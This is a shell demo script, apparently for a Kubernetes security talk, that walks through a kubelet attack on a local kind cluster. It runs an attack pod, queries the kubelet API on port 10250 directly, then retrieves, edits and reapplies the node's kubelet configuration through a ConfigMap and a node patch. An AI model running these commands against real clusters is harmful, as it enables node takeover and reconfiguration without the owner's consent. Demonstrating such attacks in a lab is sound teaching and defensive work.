#!/bin/bash

########################
# include the magic
########################
. ./lib/demo-magic.sh
TYPE_SPEED=25
cd 4-kubelet-exploit
clear

echo ""

kubectx kind-kind 2> /dev/null 1> /dev/null

p "# Run another attack pod"
pe "kubectl run attackpod --image=raesene/alpine-nettools:latest" 2> /dev/null

ATTACKPOD="$(kubectl get pod -l run=attackpod -o name| head -1 | sed -e 's#^pod\/##g')"
while [[ $(kubectl get pods -l run=attackpod -o 'jsonpath={..status.conditions[?(@.type=="Ready")].status}') != "True" ]]; do echo "waiting for pod" && sleep 2; done

p "# Use the attack pod to curl the local node's kubelet API directly on port 10250"
pe "kubectl exec -it $ATTACKPOD -- /bin/sh -c 'curl -sk https://172.22.0.3:10250/runningpods/'"

kubectl proxy --port=8001 & 2> /dev/null 1> /dev/null

p "# Retrieve the current kubelet's configuration"
pe "curl -sSL \"http://localhost:8001/api/v1/nodes/kind-worker/proxy/configz\" | jq '.kubeletconfig|.kind=\"KubeletConfiguration\"|.apiVersion=\"kubelet.config.k8s.io/v1beta1\"' > kubelet_configz_kind-worker"

p "# Modify the kubelet configuration"
pe "vim kubelet_configz_kind-worker"

p "# Create the ConfigMap to hold the kubelet's configuration"
kubectl -n kube-system delete configmap my-node-config 2> /dev/null 1> /dev/null
pe "kubectl -n kube-system create configmap my-node-config --from-file=kubelet=kubelet_configz_kind-worker -o yaml"
pe "clear"

p "# Apply the updated kubelet configuration"
pe 'kubectl patch node kind-worker -p "{\"spec\":{\"configSource\":{\"configMap\":{\"name\":\"my-node-config\",\"namespace\":\"kube-system\",\"kubeletConfigKey\":\"kubelet\"}}}}"'

p "# View the new node config"
pe "kubectl edit node kind-worker"

echo "> part 2"

